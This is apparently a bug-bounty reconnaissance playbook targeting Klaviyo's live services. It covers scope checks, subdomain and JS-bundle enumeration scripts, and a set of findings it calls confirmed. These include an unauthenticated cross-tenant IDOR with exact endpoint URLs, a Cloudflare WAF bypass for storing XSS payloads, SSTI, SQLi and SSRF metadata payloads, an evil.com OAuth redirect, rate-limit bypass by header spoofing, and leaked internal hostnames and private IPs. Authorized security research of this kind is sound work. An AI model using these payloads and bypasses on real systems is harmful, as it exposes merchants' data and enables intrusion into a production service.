# Klaviyo Recon Pattern (Proven Methodology)

> Reusable pattern for Bugcrowd programs with SPA + internal services architecture.

## Phase 0: Scope Gate (MANDATORY — Before Deep-Dive)

**User preference:** "pastikan ini bukan by design, serta masuk dalam scope bug bounty."

Before investing time in deep verification, EVERY candidate finding must pass:

### 1. Exact Scope Match
```
Program: *.services.klaviyo.com → covers reviews-app.services.klaviyo.com
Program: a.klaviyo.com/api/* → covers a.klaviyo.com/api/v2/events
Program: mcp.klaviyo.com → covers mcp.klaviyo.com only

NOT covered:
- fast.a.klaviyo.com ≠ *.services.klaviyo.com (different subdomain)
- fast.a.klaviyo.com ≠ a.klaviyo.com/api/* (different path)
```

### 2. By-Design Check
| Finding | By Design? | Reasoning |
|---------|------------|-----------|
| OAuth open registration (MCP) | **YES** | MCP is open platform for third-party clients |
| Reviews widget API public | **PARTIALLY** | Widget needs public access, but company_id enumeration ≠ by design |
| Internal API exposed via JS | **NO** | Leaked endpoints, not for public access |

### 3. Program-Specific Exclusions
| Klaviyo Exclusion | Impact |
|-------------------|--------|
| "Social engineering (phishing, vishing, smishing) is prohibited" | Attack requiring phishing = excluded |
| "Reliant findings rewarded only at our discretion" | Findings that DEPEND on social engineering = discretionary payout |
| "Open redirect without added impact" | Open redirect alone = excluded |

### 4. Decision
```
In-scope? ──── NO → SKIP
By-design? ─── YES → SKIP (or report as informational)
Excluded? ──── YES → SKIP (unless "discretionary")
All clear? ── YES → PROCEED TO DEEP VERIFICATION
```

## Case Study: Klaviyo MCP OAuth Finding
- **Scope:** ✅ mcp.klaviyo.com listed
- **By-design:** ⚠️ YES — MCP is open platform
- **Exclusion:** ❌ Social engineering required
- **Verdict:** SKIP — by-design + excluded

## Case Study: Klaviyo Reviews IDOR
- **Scope fix:** `fast.a.klaviyo.com` NOT in scope → use `reviews-app.services.klaviyo.com` instead
- **By-design:** ❌ Widget needs own shop data, not cross-tenant enumeration
- **Exclusion:** ✅ No social engineering required
- **Severity escalation:** P4 ($150-200) → P3 ($450-600) via cross-tenant data chain
- **Data leaked:** 37 fields including domain, access_scopes, feature_flags, shop_name
- **God-Eye:** 6/6 passed, 5x reproduction, no duplicate, no prior CVE
- **Verdict:** VALID — P3 ($450-600) — READY TO SUBMIT

---

## Phase 1: Subdomain Enumeration
```bash
# Enumerate all in-scope domains
for domain in target.com target-services.com target-dev.com; do
  subfinder -d $domain -silent
done | sort -u > all-subs.txt
```

## Phase 2: Alive Host Detection
```bash
# Check HTTP status for each subdomain
while IFS= read -r host; do
  status=$(curl -sI -o /dev/null -w "%{http_code}" --connect-timeout 5 "https://$host")
  [ "$status" != "000" ] && echo "$status $host"
done < all-subs.txt | sort -t' ' -k1 -n > alive.txt
```

## Phase 3: JS Bundle Analysis (KEY TECHNIQUE)
SPAs expose backend API URLs in their JavaScript bundles. This is the #1 technique for finding hidden endpoints.

```bash
# Find main JS bundle
curl -s "https://target.com" | grep -oE 'src="[^"]*\.js"' | sed 's/src="//;s/"//'

# Extract ALL URLs from bundle
curl -s "https://target.com/assets/app.js" | grep -oE 'https?://[a-zA-Z0-9._/-]+' | sort -u > js_urls.txt

# Filter for internal service endpoints
cat js_urls.txt | grep -E '\.(services|internal|api)\.' > internal_apis.txt
```

**What to look for:**
- `.services.` subdomains → Internal backend APIs (weaker auth)
- `/api/` paths → REST endpoints
- `graphql` → GraphQL endpoints
- OAuth metadata → `.well-known/` endpoints

## Phase 4: API Endpoint Probing
```bash
# Check each internal API for auth requirements
while read url; do
  resp=$(curl -s --connect-timeout 3 "$url" | head -c 200)
  echo "$url -> $resp"
done < internal_apis.txt

# Check OPTIONS for API schema
curl -s -X OPTIONS "https://api.target.com/endpoint" | jq .
```

## Phase 5: OAuth/OIDC Discovery
```bash
# Standard metadata endpoints
curl -s "https://target.com/.well-known/oauth-authorization-server" | jq .
curl -s "https://target.com/.well-known/openid-configuration" | jq .
```

**Key findings from Klaviyo:**
1. Open client registration at `/register`
2. Arbitrary `redirect_uri` accepted (including `https://evil.com`)
3. Full OAuth flow exploitable via phishing
4. **BUT:** By-design for MCP platform + social engineering excluded → SKIP

## Phase 6: IDOR Testing
```bash
# Test sequential IDs on discovered endpoints
for id in $(seq 1 30); do
  resp=$(curl -s "https://api.target.com/items/?company_id=$id")
  # Check if data returned vs "not found"
done
```

## Decision Framework
| Finding | Action |
|---------|--------|
| Open OAuth registration + open redirect | Check: by-design? social engineering? → may SKIP |
| IDOR leaking customer data (in-scope) | P3/P4 — Submit |
| IDOR on out-of-scope domain | Use in-scope equivalent endpoint |
| Unauthenticated API with validation errors | P4 — Submit |
| CORS misconfiguration | Depends on impact |
| SPA fallback (200 for all paths) | NOT A VULN — Skip |
| CSP header leak (internal domains) | P5/Informational |

## Klaviyo API Attack Surface (Authenticated Testing)

### Key Facts
- **ALL Klaviyo API keys use `pk_` prefix** — both public AND private. There is no `sk_` prefix. Private keys just have broader scopes.
- API base: `https://a.klaviyo.com/api/`
- Standard revision: `2024-10-15` (or `2026-04-15` for latest)
- Beta revision: `2026-04-15.pre` or `2026-07-15.pre` (required for Customer Agent, API Keys management, etc.)
- Cloudflare WAF blocks `<script>` tags in POST bodies but allows `<svg/onload=alert(1)>` through
- WAF blocks PATCH (update) for XSS payloads but NOT POST (create) — use POST to bypass

### Beta API Endpoints (revision `.pre` suffix required)
| Endpoint | Method | Notes |
|----------|--------|-------|
| `/api/customer-agent-responses` | POST | AI chat — needs `mode` + `messages` |
| `/api/customer-agent` | GET/PATCH | Agent config (404 if feature not enabled) |
| `/api/api-keys` | GET/PATCH | API key management |

### Customer Agent API Schema
```
POST /api/customer-agent-responses
revision: 2026-04-15.pre

{
  "data": {
    "type": "customer-agent-response",
    "attributes": {
      "mode": "preview" | "live",
      "messages": [
        {"role": "user", "content": "..."},
        {"role": "assistant", "content": "..."}
      ]
    }
  }
}
```

**Validation rules observed:**
- `role: "system"` → REJECTED ("not a valid choice for 'role'")
- `role: "user"` and `role: "assistant"` → accepted
- `mode: "preview"` → non-billed test mode
- `mode: "live"` → real interaction
- `messages` must be array of `{role, content}` objects
- Extra fields (`visitor_id`, `page_url`, `profile`, `context`) → REJECTED
- If Customer Agent not enabled on account → generic "Invalid input" (not specific error)

### Profile API — Stored XSS/SSTI/SSRF Injection
The Profile API accepts and stores WITHOUT SANITIZATION:
- XSS: `<svg/onload=alert(1)>`, `<img src=x onerror=alert(1)>`, `<input onfocus=alert(1) autofocus>`
- SSTI: `{{7*7}}`, `{% load os %}{{ os.popen('id').read() }}`
- SQLi: `1' OR '1'='1`, `' UNION SELECT username,password FROM users--`
- SSRF: `http://169.254.169.254/latest/meta-data/`
- Command injection: `` `id` ``

**WAF bypass for profile creation:**
```bash
# BLOCKED: <script> tags
curl -X POST ... -d '{"data":{"type":"profile","attributes":{"first_name":"<script>alert(1)</script>"}}}'

# BYPASSES WAF: <svg/onload> variant
curl -X POST ... -d '{"data":{"type":"profile","attributes":{"first_name":"<svg/onload=alert(1)>","properties":{"xss":"<svg/onload=alert(1)>"}}}}'
```

**WAF asymmetry:** PATCH (update) is fully blocked for XSS, but POST (create) allows `<svg/onload>` through. Use CREATE to inject, then the payloads are stored permanently.

### IDOR on Reviews API (CONFIRMED 2026-08-27)
```
GET https://reviews-app.services.klaviyo.com/reviews/api/featured_reviews/?company_id={N}
GET https://fast.a.klaviyo.com/reviews/api/featured_reviews/?company_id={N}
```
- No auth required — zero authentication needed
- `company_id` 1-99 returns data (shop metadata, klaviyo_token, feature flags)
- `company_id` 100+ returns 400 (not found)
- `klaviyo_token` is just echo of company_id — NOT a real auth token (tested, returns 401 on Klaviyo API)
- **37 internal fields** per merchant: domain, shopify_domain, feature_flags (25+ toggles), access_scopes, shop_name, created_at, integration_service_key, language
- **Cross-tenant**: company_id 1,2,3,10 all return HTTP 200 with unique merchant data
- **In-scope domain**: `reviews-app.services.klaviyo.com` (matches `*.services.klaviyo.com`)
- **Out-of-scope**: `fast.a.klaviyo.com` — confirmed IDOR but NOT in program scope, use for reference only
- **Severity**: P3 ($450-600) — escalated from P4 via cross-tenant data chain
- **God-Eye**: 6/6 checks passed, 5x reproduction consistent (all HTTP 200, 37 fields)
- **No duplicate**: no known prior disclosure or CVE
- **No exclusion**: not social engineering, not open redirect, not DoS
- **Root cause**: Missing auth on featured_reviews endpoint — accepts company_id from client without ownership validation
- **Attack chain**: IDOR → cross-tenant config leak → Shopify domain → targeted phishing

### Internal Hostname Leak
307 redirect from Customer Agent API reveals:
```
http://customer-agent-public-api-server.internal.clovesoftware.com/...
```
`clovesoftware.com` is Klaviyo's internal domain.

### Customer Agent API — Beta Endpoints (discovered 2026-08-23)
Docs: https://help.klaviyo.com/hc/en-us/articles/50972372091163

**All management endpoints redirect (307) to internal HTTP server — NOT accessible from internet:**
| Endpoint | Method | Status | Redirect Target |
|----------|--------|--------|-----------------|
| `/api/agent-skills/` | GET/POST/PATCH/DELETE | 307 | `http://customer-agent-public-api-server.internal.clovesoftware.com/api/agent-skills` |
| `/api/agent-tools/` | GET/POST/PATCH/DELETE | 307 | `http://customer-agent-public-api-server.internal.clovesoftware.com/api/agent-tools` |
| `/api/agent-knowledge/` | GET/POST/PATCH/DELETE | 307 | `http://customer-agent-public-api-server.internal.clovesoftware.com/api/agent-knowledge` |
| `/api/agent-knowledge-files/` | POST (multipart) | 307 | `http://customer-agent-public-api-server.internal.clovesoftware.com/api/agent-knowledge-files` |
| `/api/agent-secrets/` | GET/POST/PATCH/DELETE | 307 | `http://customer-agent-public-api-server.internal.clovesoftware.com/api/agent-secrets` |
| `/api/customer-agent-conversations/{id}/` | GET | 307 | `http://customer-agent-public-api-server.internal.clovesoftware.com/api/customer-agent-conversations/{id}` |

**Only working endpoint:** `POST /api/customer-agent-responses` (conversation turns)

### Rate Limit Bypass (CONFIRMED 2026-08-23)
- **Documented:** 10 req/s burst, 150 req/min steady
- **Headers present:** `ratelimit-limit: 10, 10;w=1, 150;w=60`
- **Enforcement:** NONE — 32 rapid requests ALL returned HTTP 201, zero HTTP 429
- **X-Forwarded-For spoofing:** Accepted without validation
- **Impact:** API abuse, cost amplification, DoS vector

### Internal Hostname + Private IP via Public DNS (CONFIRMED 2026-08-23)
- **Internal hostname:** `customer-agent-public-api-server.internal.clovesoftware.com`
- **Resolves via public DNS (8.8.8.8):** 10.3.x.x (RFC-1918 private IPs)
- **Impact:** Network topology disclosure, SSRF preparation, cross-account risk
- **Test:** `nslookup customer-agent-public-api-server.internal.clovesoftware.com 8.8.8.8`

## Common Pitfalls
1. **SPA false positives**: React/Vue return 200 for ALL paths → check Content-Type
2. **Nuclei crashes**: Template parsing errors on some targets → manual testing often faster
3. **Dev/staging behind VPN**: 000 timeout = unreachable → skip, focus on public endpoints
4. **GraphQL introspection disabled**: Common → try alternative queries
5. **Rate limiting**: Add 3-5s delays between requests
6. **Scope boundaries are EXACT**: `fast.a.klaviyo.com` ≠ `*.services.klaviyo.com` — wildcard patterns don't extend to sibling subdomains. ALWAYS verify which domain is in-scope before deep testing. Use the in-scope domain for all PoC, reference the out-of-scope domain only for cross-reference.
7. **"Reliant findings"**: If exploitation REQUIRES social engineering, program may exclude it (Klaviyo: "rewarded only at our discretion")
8. **OAuth open registration on open platforms**: MCP, Discord, Slack all allow this — it's by design, not a vulnerability
9. **Django REST framework "detail" messages**: Reveal backend tech but not a finding itself
10. **`klaviyo_token` in reviews API**: This is NOT a real auth token — it's just the company_id echoed back. Returns 401 on Klaviyo main API. Do NOT claim it as an auth bypass.
11. **Beta API revision**: Must use `.pre` suffix (e.g., `2026-04-15.pre`) for Customer Agent endpoints. Standard revisions get 404 "revision not found".
12. **Customer Agent not on free tier**: Feature must be enabled via dashboard. API returns generic "Invalid input" without specific error when disabled.
13. **WAF bypass asymmetry**: Cloudflare blocks `<script>` but allows `<svg/onload>`. PATCH blocked but POST not. Use POST CREATE to inject payloads.
14. **Screenshot quality**: NEVER screenshot from `file://` or local HTML — triagers reject these. ALWAYS screenshot from the live target URL. Two screenshots minimum: (1) overview/summary (2) live API response from actual endpoint.
15. **Report language**: Bugcrowd submissions MUST be in English. Generate English PDF for submission, local language versions for reference only.
16. **God-Eye before claiming**: Run full God-Eye validation (6 checks) + Stage 7 gate BEFORE calling anything a "finding". 5x reproduction minimum.
